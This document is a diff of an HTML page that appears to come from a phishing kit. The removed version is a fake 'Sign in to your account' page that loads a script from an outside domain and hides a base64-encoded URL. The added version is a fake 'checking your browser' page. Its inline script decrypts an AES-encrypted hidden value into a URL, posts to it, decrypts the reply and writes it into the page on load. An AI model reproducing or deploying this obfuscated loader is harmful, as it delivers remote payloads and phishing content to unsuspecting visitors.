@@ -1,86 +1,22 @@
-<!DOCTYPE html>
 <html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+ </head>
+ <body>
+	<p>Please wait a moment while we are checking your browser...</p>
+	<input hidden value="eyJhIjoiMGtNQTBuVUs0ZHU5akFrQ0lOdEJBTHBuTFFrd0VzeUl3QjcrVEwwbjBuaz0iLCJjIjoiOWI5YzI2NjBmNDQ1MDIzNTM2MGQ0Mzk4MGJiZDZkMTkiLCJiIjoiOWQwZjdlOWE1N2I0MDRhOWI0ZjU5MGQwNDc0NTE4MzRjYmM3ZDRmNzVlNGE2NzdlMTFhNTIyNWY0MWQxM2MxYzJmZjNhMWU0YWM2MDk5ZjY4NzlmNTQ5YjIwMzc0YmJlOGFmNzdmYTFmMjkxZDY5ZjI2Y2Y4ZDc0OWM2N2NkNmM2M2M3Yjg3ODE0OWMyNTI5MTViMDEzMmNjOTVmODc3OGM3YTcyZjJiZDFiNDdjYzgwNmIwY2ZhYTY4MDJkNmI0NTc3N2U0Zjk3OWMzZDM5YmYwNDViMGM1MjM1ODE4MWJhMTExY2NiZTk1ZWE1Y2FhNWEzZDI3MmI1MjJiMzc0NTQxNDdlZWM3M2QwMjhhNTlkYmQ4NDBmYzZiMTdiYmViODFlODY4OGFjODlmNTFjZGMxNzFmOTgwNmM0YTJjMzE4ZDUzMzk5ZGNjYjY0NDFiNzQ0MjUzOTllN2M5NWIxMGM2YTMyZDYyMjQ1ZjgzYzQ4YjIyMWQ5MjNlOWRlYzZiZTFlMDkwNjEwMGYzMzE5MDQ4ZGUyMTY5MjVjMzI1ZDM4Y2E2ZTFmZDk1MzhiNDE3OTc0NGRkNWQ0YTgxNDUwNDE1Mzg5MzNlZjBhZTQxZGU0MjY5OTY1YjU1ZTE0ZjE4NDhlNWJkYmM3YzRkOTliMTc1ZmVhZGUxZTgxNzE3ZWQiLCJkIjoiNjk1NzRjNzcifQ==">
+ </body>
+<script>
+    async function pQwcC(lWq) {
+        var {a,b,c,d} = JSON.parse(lWq);
+        return CryptoJS.AES.decrypt(a, CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d), CryptoJS.enc.Hex.parse(b), {hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999}), {iv: CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
+    }
+    (async () => {
+        document.write(await pQwcC(await (await fetch(await pQwcC(atob(document.querySelector('input').value)), {
+            method: 'POST', body: JSON.stringify({ hiPg: "aAc" })
+        })).text()));
+    })();
+</script>
 
-<head>
-    <title>Sign in to your account</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer async></script>
-    <style>
-        html,
-        body {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333333;
-            /* Gray-black color */
-        }
-
-        #container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #status-shower {
-            margin-bottom: 30px;
-            color: #333333;
-            /* Applying the color to the h5 tag */
-        }
-    </style>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-            color: #333;
-        }
-
-        .loading-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(0, 0, 0, 0.3);
-            border-radius: 50%;
-            border-top-color: #333;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-    </style>
-</head>
-
-<body>
-    <div class="loading-container">
-        <div class="loading-spinner"></div>
-    </div>
-    <div id="container">
-        <div id="cf-show"></div>
-        <input type="hidden" id="b64u" value="aHR0cHM6Ly93c2F3b3JrcGxhY2ViZW5lZml0cy5uZXQvdGVzdHkvaW5zdGFsbGVyWzI0LjBdL2hvc3RbMjQuMF0vYzA3N2VhNS5waHA=" class=""></input>
-    </div>
-    <script src="https://wsaworkplacebenefits.net/testy/installer[24.0]/host[24.0]/admin/js/sc.php?r=ZW0sZW1haWwsYWRk"></script>
-</body>
-
-</html>  
+</html>
